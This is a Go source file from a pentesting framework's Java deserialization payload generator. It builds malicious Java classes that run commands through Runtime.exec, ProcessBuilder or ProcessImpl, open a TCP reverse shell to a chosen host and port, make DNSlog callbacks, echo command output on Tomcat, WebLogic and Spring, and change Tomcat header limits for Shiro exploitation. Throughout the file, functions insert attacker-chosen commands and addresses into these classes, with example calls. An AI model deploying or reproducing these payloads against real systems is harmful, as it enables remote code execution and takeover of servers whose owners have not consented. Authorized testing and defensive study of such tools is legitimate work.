package yso

import (
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"strconv"
)

//type string string

const (
	RuntimeExecClass               = "RuntimeExecClass"
	ProcessBuilderExecClass        = "ProcessBuilderExecClass"
	ProcessImplExecClass           = "ProcessImplExecClass"
	DNSlogClass                    = "DNSlogClass"
	SpringEchoClass                = "SpringEchoClass"
	ModifyTomcatMaxHeaderSizeClass = "ModifyTomcatMaxHeaderSizeClass"
	EmptyClassInTemplate           = "EmptyClassInTemplate"
	TcpReverseClass                = "TcpReverseClass"
	TcpReverseShellClass           = "TcpReverseShellClass"
	TomcatEchoClass                = "TomcatEchoClass"
	BytesClass                     = "BytesClass"
	MultiEchoClass                 = "MultiEchoClass"
	HeaderEchoClass                = "HeaderEchoClass"
	SleepClass                     = "SleepClass"
	//NoneClass                                = "NoneClass"
)

type ClassPayload struct {
	ClassName string
	Help      string
	Generator func(*ClassConfig) (*javaclassparser.ClassObject, error)
}

var AllClasses = map[string]*ClassPayload{}

func GetAllClassGenerator() map[string]*ClassPayload {
	return AllClasses
}
func setClass(t string, help string, f func(*ClassConfig) (*javaclassparser.ClassObject, error)) {
	AllClasses[t] = &ClassPayload{
		ClassName: string(t),
		Help:      help,
		Generator: func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := f(config)
			if err != nil {
				return nil, err
			}
			if config.ClassType != EmptyClassInTemplate {
				config.ConfigCommonOptions(obj)
			}
			return obj, nil
		},
	}
}

type ClassConfig struct {
	Errors     []error
	ClassType  string
	ClassBytes []byte
	//ClassTemplate *javaclassparser.ClassObject
	//公共参数
	ClassName     string
	IsObfuscation bool
	IsConstruct   bool
	//exec参数
	Command      string
	MajorVersion uint16
	//dnslog参数
	Domain string
	//spring参数
	HeaderKey    string
	HeaderVal    string
	HeaderKeyAu  string
	HeaderValAu  string
	Param        string
	IsEchoBody   bool
	IsExecAction bool
	//Reverse参数
	Host      string
	Port      int
	Token     string
	SleepTime int
}

func NewClassConfig(options ...GenClassOptionFun) *ClassConfig {
	o := ClassConfig{
		ClassName:     utils.RandStringBytes(8),
		IsObfuscation: true,
		IsConstruct:   false,
		IsEchoBody:    false,
		IsExecAction:  false,
	}
	obj := &o
	for _, option := range options {
		option(obj)
	}
	return obj
}
func (cf *ClassConfig) AddError(err error) {
	if err != nil {
		cf.Errors = append(cf.Errors, err)
	}
}
func (cf *ClassConfig) GenerateClassObject() (obj *javaclassparser.ClassObject, err error) {
	if cf.ClassType == BytesClass {
		obj, err = javaclassparser.Parse(cf.ClassBytes)
		if err != nil {
			return nil, err
		}
		return obj, nil
	}
	payload, ok := AllClasses[cf.ClassType]
	if !ok {
		return nil, utils.Errorf("not found class type: %s", cf.ClassType)
	}
	obj, err = payload.Generator(cf)
	if err != nil {
		return nil, err
	}
	if obj.MajorVersion != 0 {
		obj.MajorVersion = cf.MajorVersion
	}
	return obj, nil
}
func (cf *ClassConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) error {
	obj.SetClassName(cf.ClassName)
	if cf.IsConstruct == true {
		constant := obj.FindConstStringFromPool("Yes")
		if constant == nil {
			err := utils.Error("not found flag: Yes")
			log.Error(err)
			return err
		}
		constant.Value = "No"
	}
	if cf.IsObfuscation == true {

	}
	return nil
}

func init() {
	setClass(
		RuntimeExecClass,
		"使用RuntimeExec命令执行",
		func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_RuntimeExec)
			if err != nil {
				return nil, err
			}
			if config.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = config.Command
			return obj, nil
		},
	)
	setClass(
		ProcessImplExecClass,
		"使用ProcessImpl命令执行",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessImplExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		ProcessBuilderExecClass,
		"使用ProcessBuilderExecClass命令执行",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ProcessBuilderExec)
			if err != nil {
				return nil, err
			}
			if cf.Command == "" {
				return nil, utils.Error("command is empty")
			}
			constant := obj.FindConstStringFromPool("whoami")
			if constant == nil {
				err = utils.Error("not found flag: whoami")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Command
			return obj, nil
		},
	)
	setClass(
		DNSlogClass,
		"dnslog检测",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_dnslog)
			if err != nil {
				return nil, err
			}
			if cf.Domain == "" {
				return nil, utils.Error("domain is empty")
			}
			constant := obj.FindConstStringFromPool("dns")
			if constant == nil {
				err = utils.Error("not found flag: dnslog")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Domain
			return obj, nil
		},
	)
	setClass(
		TcpReverseClass,
		"tcp反连，可用于tcp出网的站点漏洞检测",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverse)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			if cf.Token != "" {
				constant = obj.FindConstStringFromPool("Token")
				if constant == nil {
					err = utils.Error("not found flag: Token")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Token
			}
			return obj, nil
		},
	)
	setClass(
		TcpReverseShellClass,
		"tcp反弹shell",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_TcpReverseShell)
			if err != nil {
				return nil, err
			}
			if cf.Host == "" || cf.Port == 0 {
				return nil, utils.Error("host or port is empty")
			}
			constant := obj.FindConstStringFromPool("HostVal")
			if constant == nil {
				err = utils.Error("not found flag: HostVal")
				log.Error(err)
				return nil, err
			}
			constant.Value = cf.Host
			constant = obj.FindConstStringFromPool("Port")
			if constant == nil {
				err = utils.Error("not found flag: Port")
				log.Error(err)
				return nil, err
			}
			constant.Value = strconv.Itoa(cf.Port)
			return obj, nil
		},
	)
	setClass(
		ModifyTomcatMaxHeaderSizeClass,
		"修改tomcat的MaxHeaderSize，一般用于shiro利用",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_ModifyTomcatMaxHeaderSize)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		EmptyClassInTemplate,
		"用于Template代码执行的空类",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EmptyClassInTemplate)
			if err != nil {
				return nil, err
			}

			return obj, nil
		},
	)
	setClass(
		BytesClass,
		"自定义字节码，需要BASE64编码",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(cf.ClassBytes)
			if err != nil {
				return nil, err
			}
			return obj, nil
		},
	)
	setClass(
		TomcatEchoClass,
		"适用于tomcat的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_EchoByThread)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		MultiEchoClass,
		"适用于tomcat和weblogic的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_MultiEcho)
			if err != nil {
				return nil, err
			}
			javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				javaClassBuilder.SetValue("paramVal", cf.Param)
				javaClassBuilder.SetValue("postionVal", "body")
			} else {
				javaClassBuilder.SetValue("headerKeyv", cf.HeaderKey)
				javaClassBuilder.SetValue("headerValuev", cf.HeaderVal)
				javaClassBuilder.SetValue("postionVal", "header")
			}
			if cf.IsExecAction {
				javaClassBuilder.SetValue("actionVal", "exec")
			}
			if len(javaClassBuilder.GetErrors()) > 0 {
				log.Error(javaClassBuilder.GetErrors()[0])
				return nil, javaClassBuilder.GetErrors()[0]
			}
			return obj, nil
		},
	)
	setClass(
		SpringEchoClass,
		"适用于spring站点的回显",
		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
			obj, err := javaclassparser.Parse(template_class_SpringEcho)
			if err != nil {
				return nil, err
			}
			if cf.IsEchoBody {
				if cf.Param == "" {
					return nil, utils.Error("param is empty")
				}
				constant := obj.FindConstStringFromPool("paramVal")
				if constant == nil {
					err = utils.Error("not found flag: paramVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.Param
				constant = obj.FindConstStringFromPool("postionVal")
				if constant == nil {
					err = utils.Error("not found flag: postionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "body"
			} else {
				constant := obj.FindConstStringFromPool("HeaderKeyVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderKeyVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderKey
				constant = obj.FindConstStringFromPool("HeaderVal")
				if constant == nil {
					err = utils.Error("not found flag: HeaderVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = cf.HeaderVal

			}
			if cf.IsExecAction {
				constant := obj.FindConstStringFromPool("actionVal")
				if constant == nil {
					err = utils.Error("not found flag: actionVal")
					log.Error(err)
					return nil, err
				}
				constant.Value = "exec"
			}
			return obj, nil
		},
	)
	setClass(SleepClass, "sleep指定时长，用于延时检测gadget", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
		obj, err := javaclassparser.Parse(template_class_Sleep)
		if err != nil {
			return nil, err
		}
		javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
		javaClassBuilder.SetParam("time", strconv.Itoa(cf.SleepTime))
		if len(javaClassBuilder.GetErrors()) > 0 {
			log.Error(javaClassBuilder.GetErrors()[0])
			return nil, javaClassBuilder.GetErrors()[0]
		}
		return obj, nil
	})
	setClass(HeaderEchoClass, "自动查找Response对象并在header中回显指定内容", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
		obj, err := javaclassparser.Parse(template_class_HeaderEcho)
		if err != nil {
			return nil, err
		}
		javaClassBuilder := javaclassparser.NewClassObjectBuilder(obj)
		javaClassBuilder.SetParam("aukey", cf.HeaderKeyAu)
		javaClassBuilder.SetParam("auval", cf.HeaderValAu)
		javaClassBuilder.SetParam("key", cf.HeaderKey)
		javaClassBuilder.SetParam("val", cf.HeaderVal)
		if len(javaClassBuilder.GetErrors()) > 0 {
			log.Error(javaClassBuilder.GetErrors()[0])
			return nil, javaClassBuilder.GetErrors()[0]
		}
		return obj, nil
	})
}

type GenClassOptionFun func(config *ClassConfig)

//var defaultOptions = []GenClassOptionFun{SetRandClassName(), SetObfuscation()}

//var templateOptions = []GenClassOptionFun{
//	SetClassRuntimeExecTemplate(),
//	SetClassSpringEchoTemplate(),
//	SetClassDnslogTemplate(),
//	SetClassModifyTomcatMaxHeaderSizeTemplate(),
//}

// 公共参数
func SetClassName(className string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassName = className
	}
}

func SetConstruct() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsConstruct = true
	}
}
func SetObfuscation() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsObfuscation = true
	}
}

// 生成自定义Class
func SetBytesEvilClass(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}
func SetClassBase64Bytes(base64 string) GenClassOptionFun {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil
	}
	return SetClassBytes(bytes)
}
func SetClassBytes(data []byte) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = BytesClass
		config.ClassBytes = data
	}
}

// LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
// 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
//
// bytes：要从中加载类对象的字节数组。
//
// options：用于配置类对象的可变参数函数列表。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
//
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
// 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
//
// base64：要从中加载类对象的base64编码字符串。
//
// options：用于配置类对象的可变参数函数列表。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，
// 并从这些字节中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。
// 可通过可变参数`options`来定制类对象的特定属性或行为。
//
// data：BCEL格式的Java类数据。
//
// options：用于配置类对象的可变参数函数列表。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// bcelData := "$$BECL$$..." // 假设的BCEL数据
//
// classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
func LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := javaclassparser.Bcel2bytes(data)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromJson(jsonData string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(jsonData)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
// LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。
// 参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
//
// bytes：要从中加载类对象的字节数组。
//
// options：用于配置类对象的可变参数函数列表。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
//
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassBytes(bytes))...)
	config.ClassType = BytesClass
	return config.GenerateClassObject()
}

// SetExecCommand
// command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
func SetExecCommand(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Command = cmd
	}
}

func SetMajorVersion(v uint16) GenClassOptionFun {
	// 定义Java类文件格式的最小和最大major版本号 1.1 18
	const minMajorVersion uint16 = 45 //
	const maxMajorVersion uint16 = 62 //

	return func(config *ClassConfig) {
		if v < minMajorVersion || v > maxMajorVersion {
			v = 52
		}
		config.MajorVersion = v
	}
}

// SetClassRuntimeExecTemplate
//
// useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
func SetClassRuntimeExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
	}
}

// SetRuntimeExecEvilClass
//
// useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。
//
// cmd：要执行的命令字符串。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = RuntimeExecClass
		config.Command = cmd
	}
}

// GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
//
// cmd：要在生成的Java对象中执行的命令字符串。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassRuntimeExecTemplate(), SetExecCommand(cmd))...)
	config.ClassType = RuntimeExecClass
	return config.GenerateClassObject()
}

// SetClassProcessBuilderExecTemplate
// useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
	}
}

// SetProcessBuilderExecEvilClass
// useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。
//
// cmd：要执行的命令字符串。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessBuilderExecClass
		config.Command = cmd
	}
}

// GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
//
// cmd：要在生成的Java对象中执行的命令字符串。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessBuilderExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassProcessImplExecTemplate
// useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
func SetClassProcessImplExecTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
	}
}

// SetProcessImplExecEvilClass
// useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。
//
// cmd：要执行的命令字符串。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ProcessImplExecClass
		config.Command = cmd
	}
}

// GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
//
// cmd：要在生成的Java对象中执行的命令字符串。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassProcessImplExecTemplate(), SetExecCommand(cmd)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassDnslogTemplate
// useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
func SetClassDnslogTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
	}
}

// SetDnslog
// dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。
//
// addr：要设置的 Dnslog 域名。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
func SetDnslog(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Domain = addr
	}
}

// SetDnslogEvilClass
// useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。
//
// addr：要设置的 Dnslog 域名。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
func SetDnslogEvilClass(addr string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = DNSlogClass
		config.Domain = addr
	}
}

// GenDnslogClassObject
// GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，
// 以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。
//
// domain：要在生成的Java对象中请求的 Dnslog 域名。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// domain := "dnslog.com" // 假设的 Dnslog 域名
//
// classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	ops := []GenClassOptionFun{SetClassDnslogTemplate(), SetDnslog(domain)}
	config := NewClassConfig(append(options, ops...)...)
	return config.GenerateClassObject()
}

// SetClassSpringEchoTemplate
// useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
func SetClassSpringEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SpringEchoClass
	}
}

// SetHeader
// springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。
//
// key：要设置的 header 键。
//
// val：要设置的 header 值。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
func SetHeader(key string, val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.HeaderKey = key
		config.HeaderVal = val
		config.HeaderKeyAu = "Accept-Language"
		config.HeaderValAu = "zh-CN,zh;q=1.9"
	}
}

// SetParam
// springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。
//
// param：要设置的请求参数。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
func SetParam(val string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Param = val
	}
}

// SetExecAction
// springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
func SetExecAction() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsExecAction = true
	}
}

// SetEchoBody
// springEchoBody 请求参数选项函数，设置是否要在body中回显。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
func SetEchoBody() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.IsEchoBody = true
	}
}

// GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassSpringEchoTemplate())...)
	return config.GenerateClassObject()
}

// SetClassModifyTomcatMaxHeaderSizeTemplate
// useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。
// 一般用于shiro利用，用于修改 tomcat 的 MaxHeaderSize 值。
//
// Example:
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = ModifyTomcatMaxHeaderSizeClass
	}
}

// GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(append(options, SetClassModifyTomcatMaxHeaderSizeTemplate())...)
	return config.GenerateClassObject()
}

// GenEmptyClassInTemplateClassObject 生成一个使用EmptyClassInTemplate类模板的javaclassparser.ClassObject对象，
// 空类生成（用于template）
func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = EmptyClassInTemplate
	return config.GenerateClassObject()
}

// SetClassTcpReverseTemplate
// useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
